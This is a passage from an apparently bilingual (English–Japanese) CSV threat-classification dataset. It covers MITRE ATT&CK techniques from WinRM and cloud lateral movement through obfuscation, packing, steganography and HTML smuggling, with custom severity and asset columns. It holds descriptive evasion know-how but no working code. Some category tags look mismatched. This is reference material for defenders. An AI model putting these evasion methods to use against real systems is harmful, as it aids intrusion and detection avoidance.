bug),lateral-movement,Linux;Windows;macOS,credential_abuse,boundary_crossing,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--01327cde-66c4-4123-bf34-5f258d59457b,2020-02-11T18:28:44.950Z,2025-04-15T19:58:01.548Z,,,,
T1021.006,T1021,Windows Remote Management,Windows リモート管理,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user. WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the `winrm` command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014) WinRM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).(Citation: MSDN WMI)",攻撃者は、Windows リモート管理 (WinRM) を使用してリモートシステムとやり取りするために、[有効なアカウント](https://attack.mitre.org/techniques/T1078) を使用する可能性があります。 攻撃者はその後、ログオンユーザーとして操作を実行できる。WinRM は、ユーザーがリモートシステムと対話（実行可能ファイルの実行、レジストリの変更、サービスの変更など）を可能にする Windows サービスおよびプロトコルの名称である。(引用: Microsoft WinRM) `winrm`コマンドやPowerShellなどの各種プログラムから呼び出せます。(引用: Jacobsen 2014) WinRMは[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)との遠隔操作手段として利用可能です。(引用: MSDN WMI),lateral-movement,Windows,remote_service_abuse,boundary_crossing,user_interaction;endpoint_execution;network_connectivity;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--60d0c01d-e2bf-49dd-a453-f8a9c9fa6f65,2020-02-11T18:29:47.757Z,2025-04-15T23:22:03.699Z,,,,
T1021.007,T1021,Cloud Services,クラウドサービス,"Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. Many enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI. In some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password.",攻撃者は、オンプレミスのユーザーIDと同期または連携された[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用して、侵害された環境内のアクセス可能なクラウドサービスにログインする可能性があります。その後、攻撃者はログインしたユーザーとして管理操作を実行したり、クラウドホスト型リソースにアクセスしたりする可能性があります。 多くの企業では、一元管理されたユーザー ID をクラウドサービスにフェデレーションしており、ユーザーはドメイン認証情報を使用してログインし、クラウド制御プレーンにアクセスできます。 同様に、攻撃者はWebコンソールやクラウドCLI（例：[Cloud API](https://attack.mitre.org/techniques/T1059/009)）を介して利用可能なクラウドサービスに接続し、Azure PowerShell用の<code>Connect-AZAccount</code>、 Microsoft Graph PowerShell の <code>Connect-MgGraph</code>、Google Cloud CLI の <code>gcloud auth login</code> などです。場合によっては、攻撃者はユーザー名とパスワードの代わりに [アプリケーションアクセストークン](https://attack.mitre.org/techniques/T1550/001) を使用してこれらのサービスに認証できる可能性があります。,lateral-movement,SaaS;IaaS;Office Suite;Identity Provider,credential_abuse,boundary_crossing,authentication_system;identity_federation;user_interaction;endpoint_execution;cloud_control_plane;logging_monitoring,specified,Identity / SaaS (IdP/SSO);Log / Monitoring Server;Management Console for GovCloud,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0,2023-02-21T19:38:13.371Z,2025-04-15T22:03:56.494Z,,,,
T1021.008,T1021,Direct Cloud VM Connections,クラウドVMへの直接接続,"Adversaries may leverage [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log directly into accessible cloud hosted compute infrastructure through cloud native methods. Many cloud providers offer interactive connections to virtual infrastructure that can be accessed through the [Cloud API](https://attack.mitre.org/techniques/T1059/009), such as Azure Serial Console(Citation: Azure Serial Console), AWS EC2 Instance Connect(Citation: EC2 Instance Connect)(Citation: lucr-3: Getting SaaS-y in the cloud), and AWS System Manager.(Citation: AWS System Manager). Methods of authentication for these connections can include passwords, application access tokens, or SSH keys. These cloud native methods may, by default, allow for privileged access on the host with SYSTEM or root level access. Adversaries may utilize these cloud native methods to directly access virtual infrastructure and pivot through an environment.(Citation: SIM Swapping and Abuse of the Microsoft Azure Serial Console) These connections typically provide direct console access to the VM rather than the execution of scripts (i.e., [Cloud Administration Command](https://attack.mitre.org/techniques/T1651)).",攻撃者は、[有効なアカウント](https://attack.mitre.org/techniques/T1078) を悪用し、クラウドネイティブ手法を通じてアクセス可能なクラウドホスト型コンピューティングインフラに直接ログインする可能性があります。多くのクラウドプロバイダーは、[クラウドAPI](https://attack.mitre.org/techniques/T1059/009) 経由でアクセス可能な仮想インフラへの対話型接続を提供しています。例として、Azureシリアルコンソール(引用: Azure Serial Console)、AWS EC2 Instance Connect(引用: EC2 Instance Connect)(引用: lucr-3: Getting SaaS-y in the cloud)、AWS System Manager(引用: AWS System Manager)などです。これらの接続の認証方法には、パスワード、アプリケーションアクセストークン、SSHキーなどが含まれます。これらのクラウドネイティブ手法は、デフォルトでホスト上でSYSTEMまたはrootレベルの特権アクセスを許可する場合があります。 攻撃者はこれらのクラウドネイティブ手法を悪用し、仮想インフラに直接アクセスして環境内を移動する可能性があります（引用: SIMスワッピングとMicrosoft Azureシリアルコンソールの悪用）。これらの接続は通常、スクリプトの実行（例: [クラウド管理コマンド](https://attack.mitre.org/techniques/T1651)）ではなく、VMへの直接コンソールアクセスを提供します。,lateral-movement,IaaS,credential_abuse,boundary_crossing,authentication_system;privileged_account;endpoint_execution;network_connectivity;cloud_control_plane;saas_in_use;logging_monitoring,specified,Log / Monitoring Server,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--45241b9e-9bbc-4826-a2cc-78855e51ca09,2023-06-02T15:27:55.412Z,2025-04-15T22:18:53.305Z,,,,
T1022,,Data Encrypted,データの暗号化,"Data is encrypted before being exfiltrated in order to hide the information that is being exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by a defender. The encryption is performed by a utility, programming library, or custom algorithm on the data itself and is considered separate from any encryption performed by the command and control or file transfer protocol. Common file archive formats that can encrypt files are RAR and zip. Other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048)",データは、漏洩される情報を検知から隠蔽するため、または防御者による検査時に漏洩を目立たなくするため、漏洩前に暗号化される。暗号化はユーティリティ、プログラミングライブラリ、またはカスタムアルゴリズムによってデータ自体に対して行われ、コマンドアンドコントロールやファイル転送プロトコルによる暗号化とは別個のものとみなされる。ファイルを暗号化できる一般的なファイルアーカイブ形式にはRARやzipがある。 ネットワーク外への情報転送には、[C2チャネル経由の流出](https://attack.mitre.org/techniques/T1041)や[代替プロトコル経由の流出](https://attack.mitre.org/techniques/T1048)など、他の流出技術も適用される可能性がある。,exfiltration,Linux;macOS;Windows,script_command_execution,data_outflow,endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--d54416bd-0803-41ca-870a-ce1af7c05638,2017-05-31T21:30:30.260Z,2025-04-25T15:16:14.674Z,,,,
T1023,,Shortcut Modification,ショートカットの改変,Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.,ショートカットまたはシンボリックリンクは、他のファイルやプログラムを参照する手段であり、ショートカットがクリックされたりシステム起動プロセスによって実行されたりすると、それらが開かれたり実行されたりします。 攻撃者は、永続化のためのツールを実行するためにショートカットを利用することがあります。正当なプログラムのように見せかけるために[偽装](https://attack.mitre.org/techniques/T1036)を用いた間接的な手段として、新しいショートカットを作成する可能性があります。また、攻撃者はターゲットパスを編集したり、既存のショートカットを完全に置き換えたりして、意図された正当なプログラムの代わりに自身のツールが実行されるようにすることもできます。,persistence,Windows,other,foothold,user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--970cdb5c-02fb-4c38-b17e-d6327cf3c810,2017-05-31T21:30:30.757Z,2025-04-25T15:15:53.896Z,,,,
T1024,,Custom Cryptographic Protocol,カスタム暗号プロトコル,"Adversaries may use a custom cryptographic protocol or algorithm to hide command and control traffic. A simple scheme, such as XOR-ing the plaintext with a fixed key, will produce a very weak ciphertext. Custom encryption schemes may vary in sophistication. Analysis and reverse engineering of malware samples may be enough to discover the algorithm and encryption key used. Some adversaries may also attempt to implement their own version of a well-known cryptographic algorithm instead of using a known implementation library, which may lead to unintentional errors. (Citation: F-Secure Cosmicduke)",攻撃者はコマンド＆コントロール通信を隠蔽するため、カスタム暗号プロトコルやアルゴリズムを使用する可能性がある。平文を固定鍵でXOR演算するといった単純な方式では、非常に脆弱な暗号文が生成される。 カスタム暗号化スキームの複雑度は様々である。マルウェアサンプルの分析とリバースエンジニアリングにより、使用されたアルゴリズムと暗号化キーを発見できる場合がある。一部の攻撃者は、既知の実装ライブラリを使用せず、有名な暗号化アルゴリズムの独自実装を試みることもあり、これが意図しないエラーを引き起こす可能性がある。(引用元: F-Secure Cosmicduke),command-and-control,Linux;macOS;Windows,script_command_execution,remote_control,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--3b3cbbe0-6ed3-4334-b543-3ddfd8c5642d,2017-05-31T21:30:31.197Z,2025-04-25T15:15:24.943Z,,,,
T1025,,Data from Removable Media,リムーバブルメディアからのデータ,"Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media.",攻撃者は、侵害したコンピュータに接続されたリムーバブルメディアを検索し、関心のあるファイルを探す可能性があります。機密データは、侵害されたシステムに接続されたあらゆるリムーバブルメディア（光学ドライブ、USBメモリなど）から、情報漏洩前に収集される可能性があります。 対話型コマンドシェルが使用されている場合があり、[cmd](https://attack.mitre.org/software/S0106)内の一般的な機能を利用して情報を収集することがあります。一部の攻撃者は、リムーバブルメディアに対して[自動収集](https://attack.mitre.org/techniques/T1119)を使用することもあります。,collection,Linux;macOS;Windows,script_command_execution,asset_access,endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--1b7ba276-eedc-4951-a762-0ceea2c030ec,2017-05-31T21:30:31.584Z,2025-04-15T19:58:10.837Z,,,,
T1026,,Multiband Communication,マルチバンド通信,"**This technique has been deprecated and should no longer be used.** Some adversaries may split communications between different protocols. There could be one protocol for inbound command and control and another for outbound data, allowing it to bypass certain firewall restrictions. The split could also be random to simply avoid data threshold alerts on any one communication.",**この手法は非推奨となり、使用すべきではありません。** 攻撃者によっては通信を異なるプロトコル間で分割する場合があります。受信コマンド制御用と送信データ用に別々のプロトコルを使用することで、特定のファイアウォール制限を回避できます。また、単一の通信におけるデータ閾値アラートを回避するため、分割をランダムに行う場合もあります。,command-and-control,Linux;macOS;Windows,script_command_execution,remote_control,endpoint_execution;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),deprecated;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--99709758-2b96-48f2-a68a-ad7fbd828091,2017-05-31T21:30:32.259Z,2025-04-25T15:15:54.209Z,,,,
T1027,,Obfuscated Files or Information,難読化されたファイルまたは情報,"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript. Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016) Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)",攻撃者は、システム上または転送中に実行ファイルやファイルの内容を暗号化、符号化、またはその他の方法で難読化することで、その発見や分析を困難にしようとする場合があります。これは防御を回避するために異なるプラットフォームやネットワーク全体で利用される一般的な手法です。ペイロードは検出回避のために圧縮、アーカイブ化、または暗号化されることがあります。これらのペイロードは初期アクセス時やその後の段階で検出を軽減するために使用される可能性があります。 ユーザーによる操作が必要となる場合もあり、[ユーザー実行](https://attack.mitre.org/techniques/T1204)のために[ファイルや情報の難読化解除/復号化](https://attack.mitre.org/techniques/T1140)を行う必要がある。 攻撃者が提供したパスワード保護された圧縮/暗号化ファイルを開くために、ユーザーがパスワードを入力する必要が生じる場合もある（出典: Volexity PowerDuke 2016年11月）。攻撃者はJavaScriptなどの圧縮またはアーカイブ化されたスクリプトを使用することもある。ファイルの一部をエンコードすることで、防御側の発見を助ける平文文字列を隠蔽することも可能である。 (引用元: Linux/Cdorked.A We Live Security Analysis) ペイロードは、再構築時にのみ悪意のある機能を露呈する、一見無害な個別のファイルに分割される場合もある。 (引用元: Carbon Black Obfuscation 2016年9月) 攻撃者は[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)を悪用し、ペイロードから実行されるコマンドや[コマンド・スクリプトインタプリタ](https://attack.mitre.org/techniques/T1059)経由で直接実行されるコマンドを隠蔽することもある。環境変数、エイリアス、文字、その他のプラットフォーム/言語固有のセマンティクスを利用することで、シグネチャベースの検知やアプリケーション制御メカニズムを回避できる。(引用: FireEye Obfuscation 2017年6月) (引用: FireEye Revoke-Obfuscation 2017年7月)(引用: PaloAlto EncodedCommand 2017年3月),defense-evasion,Linux;macOS;Windows;Network Devices;ESXi,credential_abuse,stealth,authentication_system;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a,2017-05-31T21:30:32.662Z,2025-04-15T19:58:59.251Z,,,,
T1027.001,T1027,Binary Padding,バイナリパディング,"Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ)",攻撃者はバイナリパディングを用いてジャンクデータを追加し、マルウェアのディスク上での表現を変更することがある。これによりバイナリの機能や動作に影響を与えることなく、ファイルサイズ制限により一部のセキュリティツールが処理可能な範囲を超えるサイズに拡大できる。バイナリパディングはファイルのチェックサムを効果的に変更し、ハッシュベースのブロックリストや静的アンチウイルスシグネチャの回避にも利用可能である。(引用元: ESET OceanLotus) 使用されるパディングは通常、ジャンクデータ生成関数によって生成され、マルウェアの末尾に追加されるか、特定セクションに適用される。(引用元: Securelist Malware Tricks 2017年4月) ファイルサイズを増加させることで、大容量ファイルのスキャンに対応していないツールや検知機能の有効性が低下する可能性がある。また、分析目的での収集可能性も低下する。 VirusTotalなどの公開ファイルスキャンサービスは、分析対象のアップロードファイルの最大サイズを制限している。(引用元: VirusTotal FAQ),defense-evasion,Linux;macOS;Windows,data_collection,stealth,file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--5bfccc3f-2326-4112-86cc-c1ece9d8a2b5,2020-02-05T14:04:25.865Z,2025-04-25T14:46:48.991Z,,,,
T1027.002,T1027,Software Packing,ソフトウェアのパッキング,"Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing)",攻撃者はコードを隠蔽するため、ソフトウェアのパッキングや仮想マシンによるソフトウェア保護を行う可能性がある。ソフトウェアパッキングとは実行ファイルを圧縮または暗号化する手法である。実行ファイルをパッキングするとファイル署名が変更され、署名ベースの検知を回避しようとする。大半の解凍技術はメモリ内で実行コードを復元する。仮想マシンによるソフトウェア保護は、実行ファイルのオリジナルコードを特殊な仮想マシンでしか実行できない形式に変換する。 その後、仮想マシンがこのコードを実行するために呼び出される。(引用: ESET FinFisher Jan 2018) ソフトウェアのパッキングを行うユーティリティはパッカーと呼ばれる。代表的なパッカーにはMPRESSやUPXがある。既知のパッカーのより包括的なリストは存在するが、攻撃者は防御を回避するため、よく知られたパッカーと同じ痕跡を残さない独自のパッキング手法を作成する可能性がある。(引用: Awesome Executable Packing),defense-evasion,macOS;Windows;Linux,destructive_impact,stealth,file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--deb98323-e13f-4b0c-8d94-175379069062,2020-02-05T14:17:46.686Z,2025-04-16T20:37:22.038Z,,,,
T1027.003,T1027,Steganography,ステガノグラフィ,"Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files. [Duqu](https://attack.mitre.org/software/S0038) was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.(Citation: Wikipedia Duqu) By the end of 2017, a threat group used <code>Invoke-PSImage</code> to hide [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands in an image file (.png) and execute the code on a victim's system. In this particular case the [PowerShell](https://attack.mitre.org/techniques/T1059/001) code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.(Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)",攻撃者は隠された情報の検出を回避するため、ステガノグラフィ技術を使用することがある。ステガノグラフィ技術は、画像、音声トラック、動画クリップ、テキストファイルなどのデジタルメディア内にデータを隠すために使用される。 [Duqu](https://attack.mitre.org/software/S0038)はステガノグラフィを用いた初期のマルウェアの例である。被害者システムから収集した情報を暗号化し、画像をC2サーバーへ流出させる前に画像内に隠蔽した。(出典: Wikipedia Duqu)2017年末までに、ある脅威グループは<code>Invoke-PSImage</code>を使用して、画像ファイル(.png)内に[PowerShell](https://attack.mitre.org/techniques/T1059/001)コマンドを隠蔽し、被害者のシステム上でコードを実行した。 この特定のケースでは、[PowerShell](https://attack.mitre.org/techniques/T1059/001)コードが別の難読化スクリプトをダウンロードし、被害者のマシンから情報を収集して攻撃者に送信した。(引用元: McAfee Malicious Doc Targets Pyeongchang Olympics),defense-evasion,Linux;macOS;Windows,script_command_execution,stealth,endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--c2e147a9-d1a8-4074-811a-d8789202d916,2020-02-05T14:28:16.719Z,2025-04-15T23:13:05.893Z,,,,
T1027.004,T1027,Compile After Delivery,配信後のコンパイル,"Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as ilasm.exe(Citation: ATTACK IQ), csc.exe, or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018) Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)",攻撃者は、未コンパイルコードとしてファイルを被害者に配信することで、ペイロードの発見と分析を困難にしようとする場合があります。テキストベースのソースコードファイルは、実行可能ファイル/バイナリを対象とした保護機能による分析や精査を回避できます。これらのペイロードは実行前にコンパイルが必要であり、通常はilasm.exe（出典：ATTACK IQ）、csc.exe、またはGCC/MinGWなどのネイティブユーティリティを介して行われます。(出典: ClearSky MuddyWater 2018年11月) ソースコードペイロードは、[フィッシング](https://attack.mitre.org/techniques/T1566)として配信されるファイルなど、他のファイル内に暗号化、エンコード、および/または埋め込まれる場合もある。 ペイロードは、ネイティブOSにとって認識不能かつ本質的に無害な形式（例：macOS/Linux上のEXE）で配信され、後でバンドルされたコンパイラと実行フレームワークを用いて適切な実行可能バイナリに（再）コンパイルされる場合もある。（引用元：TrendMicro WindowsAppMac）,defense-evasion,Linux;macOS;Windows,destructive_impact,stealth,user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--c726e0a2-a57a-4b7b-a973-d0f013246617,2020-03-16T15:30:57.711Z,2025-04-15T19:59:06.564Z,,,,
T1027.005,T1027,Indicator Removal from Tools,ツールからの指標除去,"Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems. A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",攻撃者は、自身の悪意あるツールが検知・隔離・制限されたと判断した場合、ツールから指標を削除することがあります。指標を削除した更新版を使用することで、標的の防御システムや同様のシステムを採用する後続の標的に検知されなくなるようツールを改変します。 典型的な例として、ファイルシグネチャで検出されアンチウイルスソフトにより隔離されたマルウェアが挙げられる。ファイルシグネチャが隔離原因と判明した場合、攻撃者は当該シグネチャを明示的に回避するようファイルを改変し、マルウェアを再利用する可能性がある。,defense-evasion,Linux;macOS;Windows,other,stealth,file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--b0533c6e-8fea-4788-874f-b799cacc4b92,2020-03-19T21:27:32.820Z,2025-04-16T20:37:19.031Z,,,,
T1027.006,T1027,HTML Smuggling,HTML密輸,"Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.(Citation: HTML Smuggling Menlo Security 2020)(Citation: Outlflank HTML Smuggling 2018) Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)), potentially bypassing content filters. For example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as <code>msSaveBlob</code>.(Citation: HTML Smuggling Menlo Security 2020)(Citation: MSTIC NOBELIUM May 2021)(Citation: Outlflank HTML Smuggling 2018)(Citation: nccgroup Smuggling HTA 2017)",攻撃者は、一見無害なHTMLファイル内に悪意のあるペイロードを隠蔽することで、コンテンツフィルターを迂回してデータやファイルを密輸する可能性がある。HTML文書はJavaScript Blobs（生のバイト列を表す不変データ）と呼ばれる大規模なバイナリオブジェクトを保存でき、後でファイルのようなオブジェクトに構築される。データはData URLにも保存可能であり、これによりメディアタイプやMIMEファイルをHTML文書内にインラインで埋め込むことができる。 HTML5ではファイルダウンロードを開始するdownload属性も導入された。（引用元: HTML Smuggling Menlo Security 2020）（引用元: Outlflank HTML Smuggling 2018）攻撃者はJavaScript BlobやHTML5のdownload属性を悪用し、HTML密輸によってセキュリティ制御を迂回したペイロードを被害者に配信する可能性がある。 ウェブコンテンツフィルターなどのセキュリティ制御は、HTML/JSファイル内に密輸された悪意のあるファイルを識別できない場合があります。これは、そのコンテンツが通常は良性のMIMEタイプ（例：<code>text/plain</code>や<code>text/html</code>）に基づいている可能性があるためです。 悪意のあるファイルやデータは、データURLやJavaScript Blobを通じてHTMLファイル内に難読化・隠蔽され、被害者に到達した時点で復号化される可能性がある（例：[ファイルや情報の復号化/デコード](https://attack.mitre.org/techniques/T1140)）。これによりコンテンツフィルタを迂回する恐れがある。 例えば、JavaScript Blobs は、被害者のマシンで悪意のあるファイルを動的に生成するために悪用される可能性があり、<code>msSaveBlob</code> などの JavaScript 関数を悪用してディスクにドロップされる可能性があります。(引用: HTML Smuggling Menlo Security 2020)(引用: MSTIC NOBELIUM May 2021)(引用: Outlflank HTML Smuggling 2018)(引用: nccgroup Smuggling HTA 2017),defense-evasion,Windows;Linux;macOS,script_command_execution,stealth,endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--d4dc46e3-5ba5-45b9-8204-010867cacfcb,2021-05-20T12:20:42.219Z,2025-04-15T19:59:12.085Z,,,,
T1027.007,T1027,Dynamic API Resolution,動的API解決,"Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various [Native API](https://attack.mitre.org/techniques/T1106) functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts. API functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.(Citation: Huntress API Hash)(Citation: IRED API Hashing) To avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to [Software Packing](https://attack.mitre.org/techniques/T1027/002), dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime. Various methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) during execution).(Citation: BlackHat API Packers)(Citation: Drakonia HInvoke)(Citation: Huntress API Hash)",攻撃者は、悪意のある機能を隠蔽し防御分析を妨害するため、マルウェアが呼び出すAPI関数を難読化してから動的に解決する場合がある。マルウェアは、プロセス、ファイル、その他のシステムアーティファクトに関連するタスクを実行するために、OSが提供する様々な[ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数を一般的に使用する。 